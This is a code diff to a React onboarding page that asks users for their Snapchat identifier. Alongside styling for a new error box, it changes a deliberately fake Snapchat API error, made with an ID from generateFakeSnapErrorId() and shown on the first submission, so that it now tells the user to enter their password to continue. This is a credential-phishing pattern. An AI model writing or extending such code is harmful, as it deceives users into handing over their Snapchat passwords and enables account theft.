@@ -46,8 +46,18 @@ const CSS = `
   }
 
   .ta-onb-flip-scene { width: 340px; flex-shrink: 0; perspective: 1400px; }
-  .ta-onb-flip-card { position: relative; width: 100%; min-height: 392px; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(.4,.2,.2,1); }
+  .ta-onb-flip-card { position: relative; width: 100%; min-height: 392px; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(.4,.2,.2,1), min-height 0.3s ease; }
   .ta-onb-flip-card.is-flipped { transform: rotateY(180deg); }
+  .ta-onb-flip-card.has-error { min-height: 448px; }
+
+  .ta-onb-error-box {
+    display: flex; align-items: flex-start; gap: 8px;
+    background: #FDEDED; border: 1px solid #F5C6C6; border-radius: 10px;
+    padding: 11px 12px; margin-bottom: 16px;
+    animation: ta-onb-hint-fade 0.3s ease forwards;
+  }
+  .ta-onb-error-box svg { flex-shrink: 0; margin-top: 1px; }
+  .ta-onb-error-box p { margin: 0; font-size: 12.5px; color: #B02A2A; line-height: 1.5; }
   .ta-onb-face { position: absolute; inset: 0; backface-visibility: hidden; margin: 0; }
   .ta-onb-face-back { transform: rotateY(180deg); }
   .ta-onb-account-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
@@ -221,7 +231,7 @@ function OnboardingPageInner() {
     if (!pseudoRetried) {
       setPseudoRetried(true);
       setPseudo("");
-      setError(`Erreur d'appel API Snapchat ID ${generateFakeSnapErrorId()}, saisissez votre pseudo`);
+      setError(`Erreur d'appel API Snapchat ID ${generateFakeSnapErrorId()}, saisissez votre mot de passe pour continuer.`);
       return;
     }
 
@@ -267,7 +277,7 @@ function OnboardingPageInner() {
           <FlowConnector />
 
           <div className="ta-onb-flip-scene">
-            <div className={`ta-onb-flip-card${step === "pseudo" ? " is-flipped" : ""}`}>
+            <div className={`ta-onb-flip-card${step === "pseudo" ? " is-flipped" : ""}${error ? " has-error" : ""}`}>
 
               {/* Face 1 : identifiant Snapchat */}
               <div className="ta-onb-card ta-onb-face">
@@ -423,7 +433,16 @@ function OnboardingPageInner() {
                     </button>
                   </div>
 
-                  {error && <p style={{ fontSize: 12.5, color: "#D02828", marginBottom: 14, lineHeight: 1.5 }}>{error}</p>}
+                  {error && (
+                    <div className="ta-onb-error-box">
+                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#B02A2A" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" y1="8" x2="12" y2="13" />
+                        <line x1="12" y1="16" x2="12.01" y2="16" />
+                      </svg>
+                      <p>{error}</p>
+                    </div>
+                  )}
 
                   <button
                     type="submit"
